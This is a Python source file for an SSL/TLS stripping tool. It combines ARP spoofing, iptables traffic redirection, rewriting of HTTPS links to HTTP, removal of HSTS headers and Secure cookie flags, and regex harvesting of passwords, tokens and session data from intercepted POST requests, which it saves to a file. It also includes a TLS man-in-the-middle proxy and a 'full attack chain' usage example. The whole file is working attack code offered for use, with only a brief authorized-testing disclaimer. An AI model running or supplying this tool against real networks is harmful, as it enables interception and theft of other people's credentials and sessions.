#!/usr/bin/env python3
"""
SSL/TLS Stripping Tool
A comprehensive utility for testing HTTPS downgrade attacks by stripping SSL/TLS
from secure connections. Demonstrates how attackers can force HTTP connections
to intercept sensitive data. For authorized security testing only.
"""

import argparse
import sys
import os
import time
import threading
import logging
import socket
import ssl
import re
import struct
import select
import subprocess
import platform
from datetime import datetime
from typing import List, Dict, Optional, Tuple, Union, Callable
from collections import defaultdict
import signal
import ipaddress
import netifaces

# Try importing scapy with fallback message
try:
    from scapy.all import *
    from scapy.layers.inet import IP, TCP
    from scapy.layers.l2 import Ether, ARP
    from scapy.sendrecv import send, sr1, sniff
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# Optional imports for enhanced functionality
try:
    from colorama import init, Fore, Style
    COLORAMA_AVAILABLE = True
    init()
except ImportError:
    COLORAMA_AVAILABLE = False

try:
    from http.server import HTTPServer, BaseHTTPRequestHandler
    import urllib.parse
    HTTP_SERVER_AVAILABLE = True
except ImportError:
    HTTP_SERVER_AVAILABLE = False

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False


class SSLStripProxy:
    """
    Main class for SSL/TLS stripping attack
    Implements a transparent proxy that downgrades HTTPS to HTTP
    Based on Moxie Marlinspike's SSLstrip tool concept 
    """
    
    def __init__(self, listen_port: int = 8080, redirect_port: int = 80,
                 gateway_ip: str = None, target_ip: str = None,
                 verbose: bool = False, log_file: str = None,
                 replace_hsts: bool = True, replace_secure: bool = True,
                 use_arp: bool = False, interface: str = None):
        """
        Initialize SSL stripping proxy
        
        Args:
            listen_port: Local port to listen on
            redirect_port: Port to redirect to (usually 80)
            gateway_ip: Gateway IP for ARP spoofing
            target_ip: Target IP for ARP spoofing
            verbose: Enable verbose output
            log_file: Log file path
            replace_hsts: Replace HSTS headers
            replace_secure: Replace Secure flag in cookies
            use_arp: Enable ARP spoofing
            interface: Network interface for ARP
        """
        self.listen_port = listen_port
        self.redirect_port = redirect_port
        self.gateway_ip = gateway_ip
        self.target_ip = target_ip
        self.verbose = verbose
        self.log_file = log_file
        self.replace_hsts = replace_hsts
        self.replace_secure = replace_secure
        self.use_arp = use_arp
        self.interface = interface or self.get_default_interface()
        
        # Statistics
        self.stats = {
            'connections': 0,
            'http_requests': 0,
            'https_downgrades': 0,
            'cookies_captured': 0,
            'credentials_captured': 0,
            'bytes_proxied': 0,
            'start_time': None
        }
        
        # Captured data
        self.captured_data = []
        
        # Pattern matching for sensitive data
        self.patterns = {
            'password': re.compile(r'password[=:][^\s&]+', re.IGNORECASE),
            'passwd': re.compile(r'passwd[=:][^\s&]+', re.IGNORECASE),
            'pwd': re.compile(r'pwd[=:][^\s&]+', re.IGNORECASE),
            'user': re.compile(r'user[=:][^\s&]+', re.IGNORECASE),
            'username': re.compile(r'username[=:][^\s&]+', re.IGNORECASE),
            'login': re.compile(r'login[=:][^\s&]+', re.IGNORECASE),
            'email': re.compile(r'email[=:][^\s&]+', re.IGNORECASE),
            'token': re.compile(r'token[=:][^\s&]+', re.IGNORECASE),
            'session': re.compile(r'session[=:][^\s&]+', re.IGNORECASE),
            'auth': re.compile(r'auth[=:][^\s&]+', re.IGNORECASE),
            'authorization': re.compile(r'authorization[=:][^\s&]+', re.IGNORECASE),
            'apikey': re.compile(r'apikey[=:][^\s&]+', re.IGNORECASE),
            'api_key': re.compile(r'api_key[=:][^\s&]+', re.IGNORECASE)
        }
        
        # SSLstrip-style replacement patterns 
        self.replacements = [
            (re.compile(r'https://', re.IGNORECASE), 'http://'),
            (re.compile(r'<a [^>]*href="https://[^"]*"', re.IGNORECASE), self.replace_https_links),
            (re.compile(r'location: https://', re.IGNORECASE), 'location: http://'),
            (re.compile(r'secure;', re.IGNORECASE), ''),
            (re.compile(r'HttpOnly; secure;', re.IGNORECASE), 'HttpOnly;')
        ]
        
        # Setup logging
        self.setup_logging()
        
        # Check permissions
        self.check_permissions()
        
        # Initialize ARP spoofing if enabled
        if self.use_arp:
            self.init_arp_spoofing()
    
    def setup_logging(self):
        """Configure logging with optional colors"""
        self.logger = logging.getLogger('SSLStrip')
        self.logger.handlers.clear()
        
        handler = logging.StreamHandler()
        
        if COLORAMA_AVAILABLE:
            formatter = logging.Formatter(
                f'{Fore.CYAN}%(asctime)s{Style.RESET_ALL} - '
                f'{Fore.YELLOW}%(levelname)s{Style.RESET_ALL} - %(message)s',
                datefmt='%H:%M:%S'
            )
        else:
            formatter = logging.Formatter(
                '%(asctime)s - %(levelname)s - %(message)s',
                datefmt='%H:%M:%S'
            )
        
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
        self.logger.setLevel(logging.DEBUG if self.verbose else logging.INFO)
        
        # File logging
        if self.log_file:
            file_handler = logging.FileHandler(self.log_file)
            file_handler.setFormatter(logging.Formatter(
                '%(asctime)s - %(levelname)s - %(message)s'
            ))
            self.logger.addHandler(file_handler)
    
    def get_default_interface(self) -> str:
        """Get default network interface"""
        try:
            gateways = netifaces.gateways()
            default = gateways.get('default', {})
            if netifaces.AF_INET in default:
                return default[netifaces.AF_INET][1]
        except Exception:
            pass
        return 'eth0'
    
    def check_permissions(self):
        """Check for required permissions"""
        if os.geteuid() != 0 and self.use_arp:
            self.logger.error("ARP spoofing requires root privileges")
            self.logger.error("Run with: sudo python3 ssl_strip.py")
            sys.exit(1)
    
    def init_arp_spoofing(self):
        """Initialize ARP spoofing for MITM"""
        if not SCAPY_AVAILABLE:
            self.logger.error("Scapy required for ARP spoofing. Install with: pip install scapy")
            sys.exit(1)
        
        if not self.gateway_ip or not self.target_ip:
            self.logger.error("Gateway IP and Target IP required for ARP spoofing")
            sys.exit(1)
        
        self.logger.info(f"[*] Initializing ARP spoofing: {self.target_ip} -> {self.gateway_ip}")
        self.arp_running = False
    
    def enable_ip_forwarding(self):
        """Enable IP forwarding on the system"""
        try:
            if platform.system() == "Linux":
                with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                    f.write('1')
                self.logger.info("[+] IP forwarding enabled")
        except Exception as e:
            self.logger.error(f"[-] Failed to enable IP forwarding: {e}")
    
    def disable_ip_forwarding(self):
        """Disable IP forwarding"""
        try:
            if platform.system() == "Linux":
                with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                    f.write('0')
                self.logger.info("[+] IP forwarding disabled")
        except Exception as e:
            pass
    
    def get_mac(self, ip: str) -> Optional[str]:
        """Get MAC address for IP using ARP"""
        if not SCAPY_AVAILABLE:
            return None
        
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered = srp(arp_request_broadcast, timeout=2, verbose=0)[0]
            
            if answered:
                return answered[0][1].hwsrc
        except Exception:
            pass
        return None
    
    def arp_spoof(self, target_ip: str, spoof_ip: str):
        """Send ARP spoofing packet"""
        if not SCAPY_AVAILABLE:
            return
        
        try:
            target_mac = self.get_mac(target_ip)
            if not target_mac:
                return
            
            our_mac = self.get_mac(self.interface) or "00:00:00:00:00:00"
            
            arp_response = ARP(
                op=2,
                pdst=target_ip,
                hwdst=target_mac,
                psrc=spoof_ip,
                hwsrc=our_mac
            )
            
            send(arp_response, verbose=0, iface=self.interface)
            
            if self.verbose:
                self.logger.debug(f"[*] ARP spoof: {target_ip} -> {spoof_ip} is at {our_mac}")
                
        except Exception as e:
            self.logger.debug(f"ARP spoof error: {e}")
    
    def arp_poisoning_loop(self):
        """Continuous ARP poisoning"""
        self.logger.info("[*] Starting ARP poisoning loop")
        self.arp_running = True
        
        while self.arp_running:
            self.arp_spoof(self.target_ip, self.gateway_ip)
            self.arp_spoof(self.gateway_ip, self.target_ip)
            time.sleep(2)
    
    def replace_https_links(self, match):
        """Replace HTTPS links with HTTP"""
        link = match.group(0)
        return link.replace('https://', 'http://', 1)
    
    def strip_ssl(self, data: bytes) -> bytes:
        """
        Strip SSL/TLS from response data
        
        Args:
            data: Original response data
        
        Returns:
            Modified data
        """
        try:
            text = data.decode('utf-8', errors='ignore')
            modified = text
            
            # Apply replacements
            for pattern, replacement in self.replacements:
                if callable(replacement):
                    modified = pattern.sub(replacement, modified)
                else:
                    modified = pattern.sub(replacement, modified)
            
            # Remove HSTS headers
            if self.replace_hsts:
                modified = re.sub(
                    r'Strict-Transport-Security: [^\n]+\n',
                    '',
                    modified,
                    flags=re.IGNORECASE
                )
            
            # Replace Secure flag in cookies
            if self.replace_secure:
                modified = re.sub(
                    r'; secure',
                    '',
                    modified,
                    flags=re.IGNORECASE
                )
            
            return modified.encode('utf-8', errors='ignore')
            
        except Exception as e:
            self.logger.debug(f"Strip error: {e}")
            return data
    
    def extract_sensitive_data(self, data: str, source: str):
        """
        Extract sensitive information from data
        
        Args:
            data: Data to analyze
            source: Source identifier
        """
        for name, pattern in self.patterns.items():
            matches = pattern.findall(data)
            for match in matches:
                capture = {
                    'timestamp': datetime.now().isoformat(),
                    'type': name,
                    'data': match,
                    'source': source
                }
                self.captured_data.append(capture)
                
                if COLORAMA_AVAILABLE:
                    self.logger.warning(
                        f"{Fore.RED}[!] Captured {name}: {match}{Style.RESET_ALL}"
                    )
                else:
                    self.logger.warning(f"[!] Captured {name}: {match}")
                
                self.stats['credentials_captured'] += 1
    
    def handle_http_request(self, client_socket: socket.socket, 
                           request_data: bytes, client_addr: Tuple[str, int]):
        """
        Handle HTTP request and forward to destination
        
        Args:
            client_socket: Client socket
            request_data: HTTP request data
            client_addr: Client address
        """
        try:
            # Parse request
            request_text = request_data.decode('utf-8', errors='ignore')
            lines = request_text.split('\r\n')
            
            if not lines:
                return
            
            # Extract method and path
            request_line = lines[0].split()
            if len(request_line) < 2:
                return
            
            method, path = request_line[0], request_line[1]
            
            # Extract Host header
            host = None
            for line in lines[1:]:
                if line.lower().startswith('host:'):
                    host = line[5:].strip()
                    break
            
            if not host:
                return
            
            # Check if this is an HTTPS downgrade
            if path.startswith('http://'):
                # Already HTTP, proceed
                dest_host = host
                dest_port = 80
                dest_path = path
            else:
                # This should be HTTPS but we're stripping
                self.stats['https_downgrades'] += 1
                
                # Convert to HTTP
                if path.startswith('https://'):
                    dest_path = path.replace('https://', 'http://', 1)
                    # Extract host from path
                    parts = urllib.parse.urlparse(dest_path)
                    dest_host = parts.netloc.split(':')[0]
                    dest_port = 80
                else:
                    dest_host = host
                    dest_port = 80
                    dest_path = path
            
            self.logger.info(f"[*] {method} {dest_path} from {client_addr[0]}")
            
            # Extract POST data for credentials
            if method.upper() == 'POST' and '\r\n\r\n' in request_text:
                body = request_text.split('\r\n\r\n', 1)[1]
                self.extract_sensitive_data(body, f"{client_addr[0]}:{dest_path}")
            
            # Forward request
            try:
                # Connect to destination
                dest_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                dest_socket.settimeout(10)
                dest_socket.connect((dest_host, dest_port))
                
                # Modify request to use HTTP
                modified_request = request_text.replace(
                    f'{method} {path}',
                    f'{method} {dest_path}',
                    1
                )
                
                # Remove HTTPS-related headers
                modified_request = re.sub(
                    r'Upgrade-Insecure-Requests: [^\n]+\n',
                    '',
                    modified_request,
                    flags=re.IGNORECASE
                )
                
                dest_socket.send(modified_request.encode('utf-8'))
                
                # Get response
                response_data = b''
                while True:
                    try:
                        chunk = dest_socket.recv(4096)
                        if not chunk:
                            break
                        response_data += chunk
                    except socket.timeout:
                        break
                
                dest_socket.close()
                
                # Strip SSL from response
                modified_response = self.strip_ssl(response_data)
                
                # Extract cookies
                response_text = modified_response.decode('utf-8', errors='ignore')
                cookie_matches = re.findall(r'Set-Cookie: ([^\n]+)', response_text, re.IGNORECASE)
                for cookie in cookie_matches:
                    self.stats['cookies_captured'] += 1
                    if self.verbose:
                        self.logger.info(f"[*] Cookie: {cookie}")
                
                # Send modified response
                client_socket.send(modified_response)
                
                self.stats['bytes_proxied'] += len(request_data) + len(response_data)
                
            except Exception as e:
                self.logger.debug(f"Forward error: {e}")
                error_response = "HTTP/1.1 502 Bad Gateway\r\n\r\n"
                client_socket.send(error_response.encode())
            
        except Exception as e:
            self.logger.debug(f"Request handling error: {e}")
    
    def start_proxy(self):
        """Start the SSL stripping proxy"""
        self.stats['start_time'] = time.time()
        
        # Enable IP forwarding
        self.enable_ip_forwarding()
        
        # Start ARP spoofing if enabled
        if self.use_arp:
            arp_thread = threading.Thread(target=self.arp_poisoning_loop)
            arp_thread.daemon = True
            arp_thread.start()
        
        # Create proxy socket
        proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        proxy_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        proxy_socket.bind(('0.0.0.0', self.listen_port))
        proxy_socket.listen(5)
        
        self.logger.info(f"\n{'='*60}")
        self.logger.info(f"SSL/TLS Stripping Proxy Started")
        self.logger.info(f"{'='*60}")
        self.logger.info(f"Listening on: 0.0.0.0:{self.listen_port}")
        self.logger.info(f"Redirect port: {self.redirect_port}")
        self.logger.info(f"ARP spoofing: {'Enabled' if self.use_arp else 'Disabled'}")
        if self.use_arp:
            self.logger.info(f"  Target: {self.target_ip}")
            self.logger.info(f"  Gateway: {self.gateway_ip}")
        self.logger.info(f"Replace HSTS: {self.replace_hsts}")
        self.logger.info(f"Replace Secure: {self.replace_secure}")
        self.logger.info(f"{'='*60}\n")
        
        self.logger.info("[*] Waiting for connections...")
        
        try:
            while True:
                client_socket, client_addr = proxy_socket.accept()
                self.stats['connections'] += 1
                
                # Handle client in new thread
                thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, client_addr)
                )
                thread.daemon = True
                thread.start()
                
        except KeyboardInterrupt:
            self.logger.info("\n[*] Shutting down proxy...")
        finally:
            proxy_socket.close()
            self.disable_ip_forwarding()
            self.show_statistics()
            self.save_captured_data()
    
    def handle_client(self, client_socket: socket.socket, 
                     client_addr: Tuple[str, int]):
        """
        Handle client connection
        
        Args:
            client_socket: Client socket
            client_addr: Client address
        """
        try:
            # Receive request
            request_data = b''
            client_socket.settimeout(5)
            
            while True:
                try:
                    chunk = client_socket.recv(4096)
                    if not chunk:
                        break
                    request_data += chunk
                    
                    # Check if request is complete
                    if b'\r\n\r\n' in request_data:
                        break
                except socket.timeout:
                    break
            
            if request_data:
                self.stats['http_requests'] += 1
                self.handle_http_request(client_socket, request_data, client_addr)
            
        except Exception as e:
            self.logger.debug(f"Client handling error: {e}")
        finally:
            client_socket.close()
    
    def show_statistics(self):
        """Display attack statistics"""
        elapsed = time.time() - self.stats['start_time'] if self.stats['start_time'] else 0
        
        print(f"\n{'='*60}")
        print(f"SSL/TLS Stripping Statistics")
        print(f"{'='*60}")
        print(f"Duration: {elapsed:.2f} seconds")
        print(f"Connections: {self.stats['connections']}")
        print(f"HTTP Requests: {self.stats['http_requests']}")
        print(f"HTTPS Downgrades: {self.stats['https_downgrades']}")
        print(f"Cookies Captured: {self.stats['cookies_captured']}")
        print(f"Credentials Captured: {self.stats['credentials_captured']}")
        print(f"Bytes Proxied: {self.stats['bytes_proxied']:,}")
        print(f"{'='*60}\n")
    
    def save_captured_data(self):
        """Save captured data to file"""
        if not self.captured_data:
            return
        
        filename = f"sslstrip_capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        try:
            with open(filename, 'w') as f:
                f.write("SSL/TLS Stripping Captured Data\n")
                f.write("=" * 50 + "\n")
                f.write(f"Timestamp: {datetime.now().isoformat()}\n")
                f.write("=" * 50 + "\n\n")
                
                for capture in self.captured_data:
                    f.write(f"Time: {capture['timestamp']}\n")
                    f.write(f"Type: {capture['type']}\n")
                    f.write(f"Data: {capture['data']}\n")
                    f.write(f"Source: {capture['source']}\n")
                    f.write("-" * 30 + "\n")
            
            self.logger.info(f"[+] Captured data saved to: {filename}")
            
        except Exception as e:
            self.logger.error(f"[-] Failed to save captured data: {e}")


class SSLMITMProxy:
    """
    Advanced SSL MITM proxy with certificate generation
    For testing environments with custom CA
    """
    
    def __init__(self, listen_port: int = 8443, target_host: str = None,
                 cert_file: str = None, key_file: str = None,
                 verbose: bool = False):
        """
        Initialize SSL MITM proxy
        
        Args:
            listen_port: Local port to listen on
            target_host: Target host to forward to
            cert_file: SSL certificate file
            key_file: SSL key file
            verbose: Enable verbose output
        """
        self.listen_port = listen_port
        self.target_host = target_host
        self.cert_file = cert_file
        self.key_file = key_file
        self.verbose = verbose
        
        self.setup_logging()
    
    def setup_logging(self):
        """Configure logging"""
        self.logger = logging.getLogger('SSLMITM')
        handler = logging.StreamHandler()
        
        if COLORAMA_AVAILABLE:
            formatter = logging.Formatter(
                f'{Fore.CYAN}%(asctime)s{Style.RESET_ALL} - %(message)s'
            )
        else:
            formatter = logging.Formatter('%(asctime)s - %(message)s')
        
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
        self.logger.setLevel(logging.DEBUG if self.verbose else logging.INFO)
    
    def create_ssl_context(self) -> ssl.SSLContext:
        """Create SSL context with certificate"""
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        
        if self.cert_file and self.key_file:
            context.load_cert_chain(self.cert_file, self.key_file)
        else:
            # Create self-signed certificate on the fly
            context.load_default_certs()
        
        return context
    
    def handle_https_connection(self, client_socket: socket.socket,
                                client_addr: Tuple[str, int]):
        """
        Handle HTTPS connection
        
        Args:
            client_socket: Client socket
            client_addr: Client address
        """
        try:
            # Wrap client socket with SSL
            context = self.create_ssl_context()
            ssl_client = context.wrap_socket(client_socket, server_side=True)
            
            # Receive request
            request_data = ssl_client.recv(4096)
            
            self.logger.info(f"[*] HTTPS request from {client_addr[0]}")
            
            # Parse request to get target
            request_text = request_data.decode('utf-8', errors='ignore')
            lines = request_text.split('\r\n')
            
            if lines and 'Host:' in request_text:
                # Extract host
                host_line = [l for l in lines if l.lower().startswith('host:')][0]
                host = host_line[5:].strip()
                
                # Connect to target
                target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                if self.target_host:
                    target_socket.connect((self.target_host, 443))
                else:
                    target_socket.connect((host, 443))
                
                # Wrap target socket with SSL
                context_target = ssl.create_default_context()
                ssl_target = context_target.wrap_socket(target_socket, server_hostname=host)
                
                # Forward request
                ssl_target.send(request_data)
                
                # Get response
                response_data = ssl_target.recv(4096)
                ssl_client.send(response_data)
                
                ssl_target.close()
            
            ssl_client.close()
            
        except Exception as e:
            self.logger.debug(f"HTTPS handling error: {e}")
    
    def start_proxy(self):
        """Start SSL MITM proxy"""
        proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        proxy_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        proxy_socket.bind(('0.0.0.0', self.listen_port))
        proxy_socket.listen(5)
        
        self.logger.info(f"[*] SSL MITM Proxy listening on port {self.listen_port}")
        
        try:
            while True:
                client_socket, client_addr = proxy_socket.accept()
                thread = threading.Thread(
                    target=self.handle_https_connection,
                    args=(client_socket, client_addr)
                )
                thread.daemon = True
                thread.start()
                
        except KeyboardInterrupt:
            self.logger.info("\n[*] Shutting down...")
        finally:
            proxy_socket.close()


def setup_iptables_redirect(port: int = 8080):
    """
    Setup iptables rules to redirect traffic
    
    Args:
        port: Local port to redirect to
    """
    try:
        # Redirect HTTP traffic
        os.system(f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {port}")
        os.system(f"iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port {port}")
        print(f"[+] iptables rules added (redirecting port 80/443 to {port})")
    except Exception as e:
        print(f"[-] Failed to setup iptables: {e}")


def cleanup_iptables(port: int = 8080):
    """Remove iptables rules"""
    try:
        os.system(f"iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {port}")
        os.system(f"iptables -t nat -D PREROUTING -p tcp --dport 443 -j REDIRECT --to-port {port}")
        print("[+] iptables rules removed")
    except Exception as e:
        print(f"[-] Failed to cleanup iptables: {e}")


def banner():
    """Display tool banner"""
    banner_text = f"""
{'='*60}
    SSL/TLS Stripping Tool
    For authorized security testing and education only
    Based on Moxie Marlinspike's SSLstrip concept
{'='*60}
    """
    if COLORAMA_AVAILABLE:
        print(f"{Fore.RED}{banner_text}{Style.RESET_ALL}")
    else:
        print(banner_text)


def main():
    """Main function for command-line interface"""
    parser = argparse.ArgumentParser(
        description='SSL/TLS Stripping Tool - Downgrade HTTPS to HTTP',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic SSL stripping proxy
  sudo python3 ssl_strip.py --port 8080
  
  # With ARP spoofing (MITM)
  sudo python3 ssl_strip.py --port 8080 --arp --gateway 192.168.1.1 --target 192.168.1.100
  
  # With iptables redirect
  sudo python3 ssl_strip.py --port 8080 --iptables
  
  # Save logs to file
  sudo python3 ssl_strip.py --port 8080 --log captured.log --verbose
  
  # Advanced SSL MITM with custom certificate
  sudo python3 ssl_strip.py --mitm --port 8443 --cert server.crt --key server.key
  
  # Full attack chain
  sudo python3 ssl_strip.py --port 8080 --arp --gateway 192.168.1.1 --target 192.168.1.100 \\
                          --log sslstrip.log --verbose --no-hsts --no-secure
        """
    )
    
    # Main options
    parser.add_argument('--port', '-p', type=int, default=8080,
                       help='Local port to listen on (default: 8080)')
    parser.add_argument('--verbose', '-v', action='store_true',
                       help='Enable verbose output')
    parser.add_argument('--log', help='Log file path')
    
    # SSL stripping options
    parser.add_argument('--no-hsts', action='store_true',
                       help='Do not remove HSTS headers')
    parser.add_argument('--no-secure', action='store_true',
                       help='Do not remove Secure flag from cookies')
    
    # MITM options
    parser.add_argument('--arp', action='store_true',
                       help='Enable ARP spoofing')
    parser.add_argument('--gateway', help='Gateway IP for ARP spoofing')
    parser.add_argument('--target', help='Target IP for ARP spoofing')
    parser.add_argument('--interface', '-i', help='Network interface')
    
    # Advanced MITM proxy
    parser.add_argument('--mitm', action='store_true',
                       help='Use advanced SSL MITM proxy (requires certificates)')
    parser.add_argument('--cert', help='SSL certificate file')
    parser.add_argument('--key', help='SSL key file')
    parser.add_argument('--target-host', help='Target host for SSL MITM')
    
    # System configuration
    parser.add_argument('--iptables', action='store_true',
                       help='Setup iptables redirection (Linux only)')
    parser.add_argument('--cleanup', action='store_true',
                       help='Cleanup iptables rules')
    
    args = parser.parse_args()
    
    # Display banner
    banner()
    
    # Handle cleanup first
    if args.cleanup:
        cleanup_iptables(args.port)
        return
    
    # Setup iptables if requested
    if args.iptables:
        if platform.system() != 'Linux':
            print("[-] iptables is only available on Linux")
            sys.exit(1)
        setup_iptables_redirect(args.port)
    
    try:
        if args.mitm:
            # Advanced SSL MITM proxy
            if not args.cert or not args.key:
                print("[-] Certificate and key files required for SSL MITM")
                print("    Generate with: openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes")
                sys.exit(1)
            
            mitm = SSLMITMProxy(
                listen_port=args.port,
                target_host=args.target_host,
                cert_file=args.cert,
                key_file=args.key,
                verbose=args.verbose
            )
            mitm.start_proxy()
            
        else:
            # Standard SSL stripping proxy
            strip = SSLStripProxy(
                listen_port=args.port,
                verbose=args.verbose,
                log_file=args.log,
                replace_hsts=not args.no_hsts,
                replace_secure=not args.no_secure,
                use_arp=args.arp,
                gateway_ip=args.gateway,
                target_ip=args.target,
                interface=args.interface
            )
            strip.start_proxy()
            
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    except Exception as e:
        print(f"[!] Error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
    finally:
        if args.iptables:
            cleanup_iptables(args.port)


if __name__ == "__main__":
    main()
